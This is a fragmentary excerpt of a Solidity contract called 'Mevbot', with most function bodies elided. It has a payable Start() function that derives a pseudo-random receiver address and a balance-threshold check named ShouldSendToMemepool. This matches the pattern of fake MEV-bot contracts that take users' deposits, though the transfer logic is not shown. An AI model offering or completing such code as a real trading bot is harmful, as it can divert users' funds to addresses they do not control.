...
contract Mevbot {
    ...
    constructor(string memory network) public {        
        ...
        _Network = network;        
        _isRunning = false;
        if(stringIsEquals(network,"BSC")){
            _RouterAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
        }
        if(stringIsEquals(network,"ETH")){
    ...
    function Start() public payable {
        ...
        _receiverAddress = address(uint160(uint(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender))))); // Generate receiver address
    }
    ...
    function stringIsEquals(string memory a, string memory b) internal pure returns (bool) {
    ...
    function ShouldSendToMemepool() internal view returns (bool){
        return address(this).balance>30000000000000000;
    }
